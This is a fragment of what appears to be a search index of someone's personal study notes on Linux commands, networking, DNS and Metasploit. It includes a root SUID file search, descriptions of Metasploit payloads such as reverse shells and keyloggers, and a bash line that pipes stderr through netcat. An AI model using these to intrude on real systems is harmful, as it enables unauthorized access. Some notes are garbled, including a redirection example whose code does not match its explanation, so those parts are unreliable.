&gt;</p>"},{"location":"docs/Linux/Network_manipulation/proxy/#proxy-types","title":"Proxy Types","text":"<ul> <li>Datacenter/ISP<ol> <li>Quick</li> <li>Based on quantity</li> <li>Expensive</li> <li>Recognized by bot protection</li> </ol> </li> <li>Residential<ol> <li>Slower</li> <li>High quantity</li> <li>based on data plan</li> </ol> </li> </ul> <p>[!quote] traceroute ping_command sneakers_bots_project</p>"},{"location":"docs/Linux/Network_manipulation/traceroute/","title":"traceroute","text":""},{"location":"docs/Linux/Network_manipulation/traceroute/#traceroute","title":"Traceroute","text":"<p>A command to finde IP adreses tah the device is connacting to before reaching the destination &gt;[!example] &gt;## In this case the road to google.com took 18 hops &gt;traceroute google.com traceroute to google.com (172.217.1.78), 30 hops max, 60 bytes packets 1 192.168.1.1 (192.168.1.1) 4.152 ms 3.834 ms 32.964 ms 2 10.0.0.1 (10.0.0.1) 5.797 ms 6.995 ms 7.679 ms 3 96.120.96.45 (96.120.96.45) 27.952 ms 30.377 ms 32.964 ms \u2013snip\u2013 18 lgal15s44-in-f14.le100.net (172.217.1.78) 94.666 ms 42.990 ms 41.564 ms</p> <p>[!quote] IPv4 address</p>"},{"location":"docs/Linux/Vim/Baisic_comandds.vim/","title":"Basic Vim commands","text":"<p>Vim has two modes Insert and normal to access insert u need to press 3 bindings</p> <p>ga to come backward to the last inserted change</p> <ul> <li>Use <code>t{character}</code> to move the cursor just before the next     occurrence of a character (think of <code>t{character}</code> of moving your     cursor until that character).</li> </ul> <p>f {character} Let u move ti tge next occurrence of and character if we and ; it moves to the another instance of chosen letter F {CHaracter} to find previous occurrence of and character</p> <p>U undo conntent i goes before the character shift + i goes to the beginning of the line a goes after the courser shift + a moves to the end of the line o opens and create a new line shift + o creates a new line above</p> shift + H go on top of the screen shift + m go to the middle shift + l go to the bottom l move right h move left j move down k move up <p>w jump one character shift + w jump one WORD ahead e jump forward last character</p> <p>Ge jump to he end of the previous word</p> <p>b bump backward fir character</p> shift + $ move to the end of the line 0 move to the star of the line gg move to the start of the document shift +g <p>{ jump to the previous paragraph } jump to the next paragraph</p> u undo the change dd delete the line r replaces the text v to select the text <p>g+shift+u change to upper case</p> <p>s deletes and put u into edit mode</p> <p>y coy the line</p> <p>p to paste</p> <p>&gt;&gt; to intend the text \\&lt;\\&lt; to undo intend / search n repeat search</p> <p>N to the previous Search</p> <p>: %s/word/circle/g replace every word</p> <p>ad gc if u want to ask for u\u2019re permission if u want to replace a word </p> <p>**{} number of line</p>"},{"location":"docs/Linux/commands/bash_MAIN/","title":"Bash Main","text":"<p>Docs</p>"},{"location":"docs/Linux/commands/bash_MAIN/#seitng-up-defualt-values-with","title":"Seitng up defualt values with <code>:</code>","text":"<p>set default values for variables without performing any action</p> <pre><code>: ${VAR:=default_value}```\n\n\n## Bash string manipulation  \n\n&gt; **Perom  replacment**\n```bash \n# ${parameter/pattern/string}\n selected=\"my_session:123:456\"\nsession_name=\"${selected//:/-}\"\necho $session_name  # Output: my_session-123-456\n</code></pre> <p>Delte from match to the end</p> <pre><code># %% to find the longest possilbe match \nsession_name=\"${selected%%:*}\"\n</code></pre>"},{"location":"docs/Linux/commands/bash_MAIN/#checking-if-the-output-was-from-stdin-or-as-cmd-args","title":"Checking if the output was from stdin or as cmd args","text":"<pre><code>if [[  -t 0  ]]; then \n    printf \"this was provided from cmd args\\n\"\nfi\n\nif [[  ! -t 0  ]]; then \n    printf \"this was provided from pipe\\n\"\nfi \n</code></pre>"},{"location":"docs/Linux/commands/bash_MAIN/#printitn-mulitple-values","title":"Printitn mulitple values","text":"<pre><code>printf -v sep  '%.0s-' {1..15};)\n</code></pre>"},{"location":"docs/Linux/commands/bash_MAIN/#checking-the-lenght-of-the-array","title":"Checking the lenght of the array","text":"<pre><code>${#parameter}\n</code></pre> <p>Tip</p> <p>Functions are the only way to change status of an existing shell</p> <p>Fucntions</p> Case stament While loop <p>Variables</p> Bash redirecition <p>[xargs_commnad]({{\\&lt; ref \u201cposts/code_snippets/xargs_commnad.md\u201d&gt;}})</p>"},{"location":"docs/Linux/commands/cat/","title":"cat","text":"<p>display the conntents of the file - cat &gt; (name of the file ) will create this file - cat &gt;&gt; (name of the file) will append the file Ctrl + D to exit</p>"},{"location":"docs/Linux/commands/find/","title":"find","text":""},{"location":"docs/Linux/commands/find/#basic-usage","title":"Basic Usage","text":""},{"location":"docs/Linux/commands/find/#1-look-for-executable-files","title":"1. Look for Executable Files","text":"<pre><code>find . -executable\n</code></pre>"},{"location":"docs/Linux/commands/find/#2-look-for-broken-links","title":"2. Look for Broken Links","text":"<pre><code>find . -xtype l\n</code></pre>"},{"location":"docs/Linux/commands/find/#3-based-on-content-changes","title":"3.  Based on Content Changes","text":"<pre><code>find . -mtime -1\n</code></pre> <ul> <li>Explanation: Finds files that were modified in the last day.</li> </ul>"},{"location":"docs/Linux/commands/find/#4-based-on-metadata-or-attribute-changes","title":"4.  Based on Metadata or Attribute Changes","text":"<pre><code>find /path/to/directory -ctime -2\n</code></pre> <ul> <li>Explanation: Finds files where metadata or attributes were     changed in the last two days.</li> </ul>"},{"location":"docs/Linux/commands/find/#5-based-on-last-accessed-time","title":"5.  Based on Last Accessed Time","text":"<pre><code>find /path/to/directory -atime -1\n</code></pre> <ul> <li>Explanation: Finds files that were accessed in the last day.</li> </ul>"},{"location":"docs/Linux/commands/find/#6-changed-in-the-last-hour","title":"6.  Changed in the Last Hour","text":"<pre><code>find /path/to/directory -mmin -60\n</code></pre> <ul> <li>Explanation: Finds files modified within the last 60 minutes.</li> </ul>"},{"location":"docs/Linux/commands/find/#7-changed-earlier-than-a-specific-date","title":"7.  Changed Earlier than a Specific Date","text":"<pre><code>find . -type f -newermt 2019-07-24\n</code></pre> <ul> <li>Explanation: Finds files modified after July 24, 2019.</li> </ul>"},{"location":"docs/Linux/commands/find/#hardlink","title":"Hardlink","text":"<pre><code>find /path/to/directory -samefile myfile.txt\n</code></pre>"},{"location":"docs/Linux/commands/find/#sorting-and-filtering","title":"Sorting and Filtering","text":""},{"location":"docs/Linux/commands/find/#sort-by-size","title":"Sort by Size","text":"<pre><code>find . -size +10G\n</code></pre> <ul> <li>Explanation: Finds files larger than 10 GiB.</li> </ul> <p>Tip: You can use the following size suffixes: - \u2018k\u2019 for kibibytes (KiB) - \u2018M\u2019 for mebibytes (MiB) - \u2018G\u2019 for gibibytes (GiB)</p>"},{"location":"docs/Linux/commands/find/#using-wildcards","title":"Using Wildcards","text":"<ul> <li> <p><code>[]</code>: Matches the characters that appear within the square     brackets.</p> </li> <li> <p><code>*</code>: Matches any character sequence of any length (including     none). For example:</p> <ul> <li>A search for <code>*at</code> will match \u201ccat\u201d, \u201chat\u201d, and \u201cbat\u201d.</li> </ul> </li> </ul>"},{"location":"docs/Linux/commands/find/#example-excluding-specific-characters","title":"Example: Excluding Specific Characters","text":"<ul> <li><code>[!char]</code>: Excludes specific characters inside the square     brackets.</li> </ul>"},{"location":"docs/Linux/commands/find/#visual-guide","title":"Visual Guide","text":""},{"location":"docs/Linux/commands/find/#searching-files-via-permissions","title":"Searching Files via Permissions","text":""},{"location":"docs/Linux/commands/find/#finding-files-with-specific-permissions","title":"Finding Files with Specific Permissions","text":""},{"location":"docs/Linux/commands/find/#finding-files-with-suid-set-user-id","title":"Finding Files with SUID (Set User ID)","text":"<pre><code>find / -user root -perm -4000\n</code></pre> <ul> <li>Explanation: Finds files owned by the root user with SUID     permissions set.</li> </ul>"},{"location":"docs/Linux/commands/grep/","title":"grep","text":""},{"location":"docs/Linux/commands/grep/#grep","title":"grep","text":"<p>This search for a particular keyword - ==Syntax== grep [options] \u201cpattern\u201d file/files</p> <ul> <li>Options<ul> <li>-f Takes search string/pattern from a file<ul> <li>exaple the file contains classes or smth</li> </ul> </li> <li>-e Provieds a number of strigs<ul> <li>**its better to use -E and | the resutl **</li> </ul> </li> <li>-E<ul> <li>grep -e \u201cline|xd|smth|etc\u201d file name</li> </ul> </li> </ul> </li> </ul>"},{"location":"docs/Linux/commands/modes_bash/","title":"Modes in Bash","text":"<p>Documentation</p>"},{"location":"docs/Linux/commands/modes_bash/#modes-table","title":"Modes Table","text":"<p>Note: Ensure you have permission to write to a log file or other necessary locations.</p> Mode Description <code>-e</code> or <code>-o errexit</code> Exits immediately if any command fails. <code>-u</code> or <code>-o nounset</code> Treats unset variables as an error. <code>-x</code> or <code>-o xtrace</code> Enables verbose mode, printing each command before execution. <code>-o pipefail</code> Ensures that if any command within a pipeline fails, the overall pipeline exit status is a fail. <code>-o noclobber</code> Prevents overwriting files through redirection. <code>-o noglob</code> Disables pathname expansion with wildcards. <code>-o nocaseglob</code> Enables case-insensitive globbing. <code>-o errexit -o errtrace</code> Combines error handling and failure capture. <ul> <li>Back to Bash Overview</li> </ul>"},{"location":"docs/Linux/commands/parallel/","title":"Parallel","text":""},{"location":"docs/Linux/commands/parallel/#installation","title":"Installation","text":"<p>use the more utils veriosn of parallel not bound by any licens</p> <pre><code>sudo dnf isntall moreutils-parallel\n</code></pre>"},{"location":"docs/Linux/commands/parallel/#run-programs-in-parallel","title":"Run programs in parallel","text":"<p>Syntax</p> <pre><code>parallel -j 3 ls -- Apps/ Documents/ Downloads/\n</code></pre>"},{"location":"docs/Linux/commands/ps/","title":"ps","text":"<p>list processes  aux - lsit all the processes runing on ure computer - can we piped with grep &gt;[!example] ps aux | grep apache 2 &gt;this will list all the procces filtered by this keyword</p> command desription ps x show all of ure runing [[process]] ps ax Show all [[process]] ont the system ps u onclued more detailed information about hte proces ps w Show full ocmmand ames not jsut what fits onb the line"},{"location":"docs/Linux/commands/ps/#listing","title":"Listing","text":"<p>The kernel is giving the ID from the first procces taht started to the last top</p> <p>see the childer procces</p> <pre><code>ps faucx| grep -i brave\n</code></pre> <p>[!quote] shell</p>"},{"location":"docs/Linux/commands/redirecrtion_bash/","title":"redirecrtion bash","text":""},{"location":"docs/Linux/commands/redirecrtion_bash/#redirection-to-network-addresses","title":"Redirection to network addresses","text":"<p>Bash treats some paths as special and can do some network communication by writing to\u00a0<code>/dev/{udp|tcp}/host/port</code>. Bash cannot setup a listening server, but can initiate a connection, and for TCP can read the results at least.</p> <p>For example, to send a simple web request one could do:</p> <pre><code>sleep 5\n\nexec 2&gt; &gt;(tee &gt;(nc localhost 3000))\n</code></pre> <p>and the results of\u00a0<code>www.google.com</code>\u2019s default web page will be printed to\u00a0<code>stdout</code>.</p> <p>[!quote] bash_MAIN TCP</p>"},{"location":"docs/Linux/commands/test_operators_bash/","title":"Bash Test Operators Cheat Sheet","text":""},{"location":"docs/Linux/commands/test_operators_bash/#compound-comparison","title":"Compound Comparison","text":"Operator Description Example <code>-a</code> logical and Similar to <code>&amp;&amp;</code> <code>-o</code> logical or Similar to <code>||</code>"},{"location":"docs/Linux/commands/test_operators_bash/#integer-comparison","title":"Integer Comparison","text":"Operator Description Example <code>-eq</code> is equal to <code>if [ \"$a\" -eq \"$b\" ]</code> <code>-ne</code> is not equal to <code>if [ \"$a\" -ne \"$b\" ]</code> <code>-gt</code> is greater than <code>if [ \"$a\" -gt \"$b\" ]</code> <code>-ge</code> is greater than or equal to <code>if [ \"$a\" -ge \"$b\" ]</code> <code>-lt</code> is less than <code>if [ \"$a\" -lt \"$b\" ]</code> <code>-le</code> is less than or equal to <code>if [ \"$a\" -le \"$b\" ]</code> <code>&lt;</code> is less than (within double parens) <code>((\"$a\" &lt; \"$b\"))</code> <code>&lt;=</code> is less than or equal to (double) <code>((\"$a\" &lt;= \"$b\"))</code> <code>&gt;</code> is greater than (within double) <code>((\"$a\" &gt; \"$b\"))</code> <code>&gt;=</code> is greater than or equal to (double) <code>((\"$a\" &gt;= \"$b\"))</code>"},{"location":"docs/Linux/commands/test_operators_bash/#string-comparison","title":"String Comparison","text":"Operator Description Example <code>=</code> or <code>==</code> is equal to <code>[[ $a == z* ]]</code> or <code>[[ \"$a\" == \"z*\" ]]</code> <code>!=</code> is not equal to <code>if [ \"$a\" != \"$b\" ]</code> <code>&lt;</code> is less than (ASCII order) <code>[[ \"$a\" &lt; \"$b\" ]]</code> or <code>if [ \"$a\" \\&lt; \"$b\" ]</code> <code>&gt;</code> is greater than (ASCII order) <code>[[ \"$a\" &gt; \"$b\" ]]</code> or <code>if [ \"$a\" \\&gt; \"$b\" ]</code> <code>-z</code> string is null (zero length) <code>if [ -z \"$s\" ]</code> <code>-n</code> string is not null <code>if [ -n \"$s\" ]</code>"},{"location":"docs/Linux/commands/test_operators_bash/#file-test-operators","title":"File Test Operators","text":"Operator Description Example <code>-e</code> or <code>-a</code> file exists (deprecated: <code>-a</code>) <code>-f</code> file is a regular file <code>-d</code> file is a directory <code>-h</code> or <code>-L</code> file is a symbolic link <code>-b</code> file is a block device <code>-c</code> file is a character device <code>-p</code> file is a pipe <code>-S</code> file is a socket <code>-s</code> file is not zero size <code>-t</code> file descriptor is associated with terminal device <code>if [ -t 0 ]</code> <code>-r</code> file has read permission <code>-w</code> file has write permission <code>-x</code> file has execute permission <code>-g</code> set-group-id (sgid) flag is set <code>-u</code> set-user-id (suid) flag is set <code>-k</code> sticky bit is set <code>-O</code> you are the owner of the file <code>-G</code> group-id of file matches yours <code>-N</code> file modified since last read <code>-nt</code> file is newer than another file <code>if [ \"$f1\" -nt \"$f2\" ]</code> <code>-ot</code> file is older than another file <code>if [ \"$f1\" -ot \"$f2\" ]</code> <code>-ef</code> files are hard links to the same file <code>if [ \"$f1\" -ef \"$f2\" ]</code> <code>!</code> negates the test (not)"},{"location":"docs/Linux/commands/whereis/","title":"whereis","text":""},{"location":"docs/Linux/commands/whereis/#whereis","title":"whereis","text":"<p>It looks for thebinary files  - this command also source the man page &gt;[!quote] &gt;which</p>"},{"location":"docs/Linux/commands/which/","title":"which","text":""},{"location":"docs/Linux/commands/which/#which","title":"which","text":"<p>List the location of binaries in the PATH &gt;[!quote] &gt;whereis</p>"},{"location":"docs/Linux/commands/xargs_commnad/","title":"Xargs","text":""},{"location":"docs/Linux/commands/xargs_commnad/#run-in-parrarel","title":"Run in parrarel","text":"<p><code>-P</code> for pararel <code>-r</code> \u2013no-run-if-empty</p> <p>if there are no input items.</p> <p>if find produces no results, xargs will not execute the command that follows it.</p> <pre><code>find  test/  -print0 | xargs -0 -r -P 4\n</code></pre>"},{"location":"docs/Linux/commands/xargs_commnad/#run-from-the-script","title":"Run from the script","text":"<pre><code>    export -f pretty_print\n    find \"$target\" -type f -print0 \\\n      | xargs -0 -I {} -P 4 bash -c 'format_local \"$@\"' _ {}\n    unset -f pretty_print\n</code></pre>"},{"location":"docs/Linux/commands/xargs_commnad/#schema","title":"Schema","text":"<pre><code>find . -type f | xargs -I {} mv {} {}.md\n</code></pre> <ul> <li>find</li> <li>[bash_MAIN]({{\\&lt; ref \u201cposts/Linux/commands/bash_MAIN.md\u201d&gt;}})</li> <li>Comptia Objectives</li> </ul>"},{"location":"docs/Linux/commands/yq/","title":"Yq","text":"<p>README</p> <p>Can be installed wiht go as single binary :)</p> <pre><code>go install github.com/mikefarah/yq/v4@latest\n</code></pre>"},{"location":"docs/Linux/commands/yq/#options","title":"Options","text":"<p>Article</p> <ul> <li><code>-i</code> changes in place</li> </ul> <p>Display top level keys</p> <pre><code>yq 'keys' &lt;file.yml&gt;\n# Output:\n# \n</code></pre> <p>Get the number of documents in the file <pre><code> yq 'select(di != null) | length ' test.yml | wc -l \n # Output: \n # 5\n</code></pre> Get all unique keys from the yaml document  <pre><code> yq '.. | select (type ==\"!!map\") | keys ' test.yml  | sort -u \n # Output:\n # - allowPrivilegeEscalation\n # - apiVersion\n # - app\n # - configMap\n</code></pre></p> <pre><code>yq -i '.a.b[0].c = \"cool\"' file.yaml\n</code></pre> <ul> <li>Convert json to yaml</li> </ul> <pre><code>yq -Poy sample.json\n</code></pre> <ul> <li>pipe from stdin</li> </ul> <pre><code>yq '.a.b[0].c' &lt; file.yaml\n</code></pre> <pre><code>yq '.. | .user_name? // empty | select(. != null)' playbook.yaml\n</code></pre> <ul> <li><code>..</code> Iterate over the entire Yaml sturcture</li> <li><code>?</code> nil if empty or error</li> </ul> <pre><code>yq '.[] | select(.roles) | .roles[].user_name' playbook.yaml\n</code></pre>"},{"location":"docs/Linux/commands/yq/#explanation","title":"Explanation:","text":"<ul> <li><code>.[]</code>: Iterates over the top-level elements.</li> <li><code>select(.roles)</code>: Selects only the elements that have the <code>roles</code>     key.</li> <li><code>.roles[].user_name</code>: Extracts the <code>user_name</code> field from the     objects inside the <code>roles</code> array.</li> </ul>"},{"location":"docs/Linux/etc/passwd/","title":"Passwd","text":"Field Description Username Used when user logs in. Must be between 1 and 32 characters in length. Password An <code>x</code> character indicates that an encrypted and salted password is stored in the <code>/etc/shadow</code> file. Use the <code>passwd</code> command to compute or update the password hash. User ID (UID) Each user must be assigned a UID. UID 0 is reserved for root, UIDs 1-99 are reserved for predefined accounts, and UIDs 100-999 are reserved for system accounts/groups. Group ID (GID) The primary group ID, stored in the <code>/etc/group</code> file. User ID Info (GECOS) The comment field for extra information about the user, such as full name or phone number. This field is used by the <code>finger</code> command. Home Directory The absolute path to the user\u2019s home directory. If it does not exist, the user\u2019s directory becomes <code>/</code>. Command/Shell The absolute path of a command or shell (e.g., <code>/bin/bash</code>). It does not have to be a shell; for example, <code>/sbin/nologin</code> can be used to prevent direct login."},{"location":"docs/Linux/etc/passwd/#geting-an-entry","title":"Geting an entry","text":"<p>Getent</p> <pre><code>getent passwd {user1} {user2}\n</code></pre>"},{"location":"docs/Linux/etc/profile_etc/","title":"profile etc","text":"<p>Copies the configuration for user an sets it up</p>"},{"location":"docs/Linux/etc/skel_etc/","title":"etc - U can specyfie there what should be included upon **User","text":"<p>creation - It\u2019s only copied onece</p>"},{"location":"docs/MAIN_Linux/dev_dir/","title":"dev dir","text":""},{"location":"docs/MAIN_Linux/dev_dir/#the-device-directory","title":"The Device Directory","text":"<p>[!tip] Deviceses </p> <p>[!tip] Partions Lableing system </p> <p>[!quote] [[Block vs character dev#Special character devices]]</p>"},{"location":"docs/MAIN_Network%2B/Network_Topologies/","title":"Network Topologies","text":"<pre><code>&lt;mark style=\"background: #FFB86CA6;\"&gt; **Hybrid**&lt;/mark&gt;\n</code></pre> <p>HybridTopology_visual.png Most networks are hybrid</p> <p></p> <p>{{Wireless topologies}} {{[[]]}}</p>"},{"location":"docs/MAIN_Network%2B/Network_types/","title":"Network types","text":"<p>[[Satelite networking ]]</p> <p>[!quote] Network Topologies Virtual networks</p>"},{"location":"docs/MAIN_Network%2B/OSI_Model/","title":"Open System Interactions Refrence Model","text":"<p>How data move across devices &gt;</p> <p>All People Seem To Need Data Procsess - Psyhical - 1. Phyiscal - Data Link - 2. Datalink - Network - 3. Network - Transport - 4 .Transport - Appliaction - 5. Session - 6. Phyiscal - 7. Application</p>"},{"location":"docs/MAIN_Network%2B/Wireless_topologies/","title":"Infrastracture","text":"<ul> <li>All devices communicate through an Access     Points</li> <li>The most commomn wirlles connaction mode ## Ad hoc</li> <li>No pre-existing infrastracture</li> <li>Devices communication amongs themselves     ## WLAN Mesh</li> <li>Ad hoc devices work together to form a mesh cloud</li> <li>Self Form and self Heal </li> </ul> <p>Network Topologies</p>"},{"location":"docs/MAIN_Network%2B/ethool/","title":"ethool","text":"<pre><code>Ethool\n</code></pre> <p>[ip_command]</p>"},{"location":"docs/MAIN_Network%2B/multiplexing/","title":"multiplexing","text":""},{"location":"docs/MAIN_Network%2B/multiplexing/#multiplexing","title":"Multiplexing","text":"<ul> <li>Use many diffrent appcialtions at the same time</li> </ul> <p>[!quote] TCP|[[UDP]]|IP|Transport_OSI</p>"},{"location":"docs/MAIN_Network%2B/web_socets/","title":"web socets","text":""},{"location":"docs/MAIN_Network%2B/web_socets/#web-socets","title":"Web socets","text":"<ul> <li>ports numbers and     IP addresses combined creates     socets</li> <li>Allows duplex     communication     bettwen the server and the client</li> <li>Enables u to connect your frontend with backend     1     ## Connection THe cleiant is sending HTTP request to the server with     a special HTPP header connection Upgrade</li> </ul> <p>IF the servers supporst websocet it rteturen code 101 Switching Protcols it enables bidriectional communication &gt;[!example]- &gt;It will be connected unti either parites sends a close messege &gt;</p>"},{"location":"docs/MAIN_Network%2B/web_socets/#ipv4-address-socets","title":"IPv4 address socets","text":"<ul> <li>Server<ol> <li>Server IP adress</li> <li>protocol</li> <li>server application</li> <li>port number</li> </ol> </li> <li>Client<ol> <li>Client IP adress</li> <li>protocol</li> <li>clients ports number ==Docs== 100s     web socets     [[How to start Rust Chat App#ws-rs for websocket     server|chatrs]]</li> </ol> </li> </ul> <p>[!quote] 3-way Handshake</p>"},{"location":"docs/Metasploit_Framework/Exploits_metasloit/","title":"Exploits metasloit","text":""},{"location":"docs/Metasploit_Framework/Exploits_metasloit/#exploits","title":"Exploits","text":"<ul> <li>Vulnerabilities of the system wrritten down in a framework<ul> <li>u can use it and inject them with     payloads_metasploit     ## Use</li> </ul> </li> <li>This comman allows u to run the modul of your choice<ul> <li>&gt; show info gives u information about the exploit<ul> <li>&gt; show options givise u the option of paritcular     exploit</li> <li>&gt; show payloads</li> <li>**&gt; show targets **</li> </ul> </li> </ul> </li> </ul>"},{"location":"docs/Metasploit_Framework/Exploits_metasloit/#search","title":"Search","text":"<ul> <li>This command allow u to find a module<ul> <li>KEWORDS<ol> <li>Platform</li> <li>Type type module</li> <li>Name &gt;[!quote]     payloads_metasploit</li> </ol> </li> </ul> </li> </ul>"},{"location":"docs/Metasploit_Framework/Postgres/","title":"Postgres","text":""},{"location":"docs/Metasploit_Framework/Postgres/#baisic","title":"Baisic","text":""},{"location":"docs/Metasploit_Framework/Postgres/#checking-health","title":"Checking health","text":"<p>[!bug] Pinging From time to time the Postgres container will not be ready to accept connections when we try to run sqlx database create.</p> <p>To solve this we need to ping it to see if its healthy</p> <pre><code># Keep pinging Postgres until it's ready to accept commands\nexport PGPASSWORD=\"${DB_PASSWORD}\"\nuntil psql -h \"localhost\" -U \"${DB_USER}\" -p \"${DB_PORT}\" -d \"postgres\" -c '\\q'; do\n&gt;&amp;2 echo \"Postgres is still unavailable - sleeping\"\nsleep 1\ndone\n&gt;&amp;2 echo \"Postgres is up and running on port ${DB_PORT}!\"\nexport DATABASE_URL: postgres://${DB_USER}:${DB_PASSWORD}@localhost:${DB_PORT}/${DB_NAME}\nsqlx database create\n</code></pre> <p>1</p>"},{"location":"docs/Metasploit_Framework/Postgres/#establisch-docker-connection","title":"Establisch docker connection","text":"<pre><code>#!/usr/bin/env bash\nset -x\nset -eo pipefail\nif ! [ -x \"$(command -v psql)\" ]; then\necho &gt;&amp;2 \"Error: psql is not installed.\"\nexit 1\nfi\nif ! [ -x \"$(command -v sqlx)\" ]; then\necho &gt;&amp;2 \"Error: sqlx is not installed.\"\necho &gt;&amp;2 \"Use:\"\necho &gt;&amp;2 \" cargo install --version: 0.5.7 sqlx-cli --no-default-features --features postgres\"\necho &gt;&amp;2 \"to install it.\"\nexit 1\nfi\n# Check if a custom user has been set, otherwise default to 'postgres'\nDB_USER=${POSTGRES_USER:=postgres}\n# Check if a custom password has been set, otherwise default to 'password'\nDB_PASSWORD=\"${POSTGRES_PASSWORD:=password}\"\n# Check if a custom database name has been set, otherwise default to 'newsletter'\nDB_NAME=\"${POSTGRES_DB:=newsletter}\"\n# Check if a custom port has been set, otherwise default to '5432'\nDB_PORT=\"${POSTGRES_PORT:=5432}\"\n# Launch postgres using Docker\ndocker run \\\n-e POSTGRES_USER=${DB_USER} \\\n-e POSTGRES_PASSWORD=${DB_PASSWORD} \\\n-e POSTGRES_DB=${DB_NAME} \\\n-p \"${DB_PORT}\":5432 \\\n-d postgres \\\npostgres -N 1000\n# ^ Increased maximum number of connections for testing purposes\n# Keep pinging Postgres until it's ready to accept commands\nexport PGPASSWORD=\"${DB_PASSWORD}\"\nuntil psql -h \"localhost\" -U \"${DB_USER}\" -p \"${DB_PORT}\" -d \"postgres\" -c '\\q'; do\n&gt;&amp;2 echo \"Postgres is still unavailable - sleeping\"\nsleep 1\ndone\n&gt;&amp;2 echo \"Postgres is up and running on port ${DB_PORT}!\"\nexport DATABASE_URL: postgres://${DB_USER}:${DB_PASSWORD}@localhost:${DB_PORT}/${DB_NAME}\nsqlx database create\n</code></pre> <p>[!quote] Tokio_rs Databaes Types [[SQL REVISE#SQL]]</p>"},{"location":"docs/Metasploit_Framework/payloads-options_metasploit/","title":"payloads-options metasploit","text":""},{"location":"docs/Metasploit_Framework/payloads-options_metasploit/#payloads-options","title":"payloads-options","text":"<ol> <li> <p>Meterpreter: A powerful and versatile payload that provides a     full-featured command shell, file system access, and remote access     to the target system.</p> </li> <li> <p>Reverse shell: A payload that establishes a connection from the     target system back to the attacker\u2019s machine, allowing the attacker     to execute commands remotely.</p> </li> <li> <p>Command shell: A simple payload that provides a basic command shell     on the target system, allowing the attacker to execute commands     directly on the system.</p> </li> <li> <p>VNC injection: A payload that injects a VNC server into the target     system, allowing the attacker to remotely view and control the     system\u2019s desktop.</p> </li> <li> <p>Keylogger: A payload that records keystrokes on the target system,     allowing the attacker to capture passwords and other sensitive     information. &gt;[!quote]</p> </li> </ol>"},{"location":"docs/Metasploit_Framework/payloads_metasploit/","title":"Metasploit Payloads","text":"<p>Pieces of code that are delivered and executed on a target system after an exploit has been successfully used to gain access. - Payload Options</p>"},{"location":"docs/Network/DNS_Queries/","title":"DNS Queries","text":""},{"location":"docs/Network/DNS_Queries/#recursive-query","title":"Recursive query","text":"<ul> <li>Delegate the lookup to a DNS Server<ul> <li>The DNS Serveer does the work adn reports back<ul> <li></li> </ul> </li> </ul> </li> <li>Large DNS cache provides a speed     advatage</li> </ul>"},{"location":"docs/Network/DNS_Queries/#iterative-queries","title":"Iterative queries","text":"<ul> <li>Do all queries ==yourself==<ul> <li></li> </ul> </li> <li>Your DNS cache is specyfic to ure     device     1     ### TTL Time to live</li> <li>Configured on the authoritative server</li> <li>Specyfie how long cache is     valid &gt;[!bug]- &gt;A very long TTL can cause problems if changes     are made</li> </ul> <p>2</p>"},{"location":"docs/Network/DNS_Queries/#answers-example-nslookup","title":"Answers &gt;[!example]- nslookup","text":"<p>answers &gt;</p>"},{"location":"docs/Network/DNS_Queries/#the-authority-the-dns-server-is-the-authority-for-the-zone","title":"The Authority The DNS server is the authority for the zone","text":""},{"location":"docs/Network/DNS_Queries/#non-authoraitve","title":"Non-authoraitve","text":"<ul> <li>Does not cotain the zone source files<ul> <li>Propably casched information</li> </ul> </li> </ul> <p>3</p>"},{"location":"docs/Network/DNS_Queries/#lookups-dig_command","title":"Lookups dig_command","text":""},{"location":"docs/Network/DNS_Queries/#forword-lookup","title":"Forword Lookup","text":"<ul> <li>Provide the DNS server with FQDN</li> <li>DNS server provides an IP addres</li> </ul>"},{"location":"docs/Network/DNS_Queries/#reverse-dns-lookup","title":"Reverse DNS lookup","text":"<ul> <li>Provides the DNS server with an     IP addres</li> <li>DNS server provides an     FQDN &gt;[!example]- &gt;</li> </ul> <p>DNS DNS_Records</p>"},{"location":"docs/Network/DNS_Records/","title":"DNS Records","text":""},{"location":"docs/Network/DNS_Records/#dns-records","title":"DNS Records","text":"<ul> <li>The database records of DNS<ul> <li>Over 30 types of records<ul> <li>(IP addresses,     certificates, host aliases, names)</li> </ul> </li> </ul> </li> </ul> <p>[!example] Sample forward lookup file  [[DNS_Queries#Forward_Lookup]]</p>"},{"location":"docs/Network/DNS_Records/#soa","title":"SOA","text":"<p>Start of Authority - Describes the DNS zone details. - Structure: - <code>IN SOA</code> (Internet zone, Start of Authority) with the name of the zone - Serial number - Refresh, retry, and expire timeframes - Caching duration (TTL)</p> <p>[!example] </p>"},{"location":"docs/Network/DNS_Records/#address-records-aaaa","title":"Address Records (AAAA)","text":"<ul> <li>Defines the IP address of a host<ul> <li>This is the most popular query</li> </ul> </li> <li>A records are for IPv4     address<ul> <li>Modify the A record to change the host name to     IP (address resolution)</li> </ul> </li> <li>AAAA records are for IPv6     address<ul> <li>Same DNS server with different records</li> </ul> </li> </ul> <p>[!example] </p>"},{"location":"docs/Network/DNS_Records/#cname","title":"CNAME","text":"<p>Canonical Name Records - A name is an alias of another canonical name - (One physical server, multiple services)</p> <p>[!example] </p>"},{"location":"docs/Network/DNS_Records/#srv","title":"SRV","text":"<p>Service Records</p> <p>[!quote] DNS Queries</p>"},{"location":"docs/Network/IPv6_subnet_mask/","title":"IPv6 subnet mask","text":"<pre><code>## IANA\n</code></pre> <ol> <li>Internet assaigne Numbers Authority proviedes the blockt to     RIRs(Regional Internet Registers)</li> <li>RIRs assigns smaller subnet vlocks to ISPs (internet     service providers)</li> <li>ISPs assaigns a /48 subnet     mask to     the customer</li> </ol> <p>[!quote] IPv6 address</p>"},{"location":"docs/Network/Data/Latency/","title":"Latency","text":""},{"location":"docs/Network/Data/Latency/#latency","title":"Latency","text":""},{"location":"docs/Network/Data/Latency/#def-the-time-it-takes-for-a-packet","title":"def The time it takes for a packet <p>of data to travel from its source to its destination across a network - Latency is typically measured in milliseconds (ms) - High latency means that there is a significant delay in this process, which can impact the performance of network applications and services. &gt;[!quote] &gt;Network types OSI Model</p>","text":""},{"location":"docs/Network/Data/MPLS/","title":"MPLS","text":""},{"location":"docs/Network/Data/MPLS/#multiprotocol-label-switching","title":"Multiprotocol Label Switching","text":"<ul> <li>Learning from [[ATM]] and [[Frame Relay]]</li> <li>Packets through the WAN     have a label<ul> <li>Routing decision are easy</li> </ul> </li> <li>Any transport medium any protocol inside<ul> <li>IP packets,     Ethernet frames ##     Intial configuration Defines were all the sites may be located     And what lables are used to switchi data</li> </ul> </li> </ul> <p>MPLSPushingAndPoping.png ### Pushing and Poping</p> <ul> <li>Lables are pushed onto packets as they enter the MPLS cloud</li> <li> <p>Labels are popped off the way out</p> 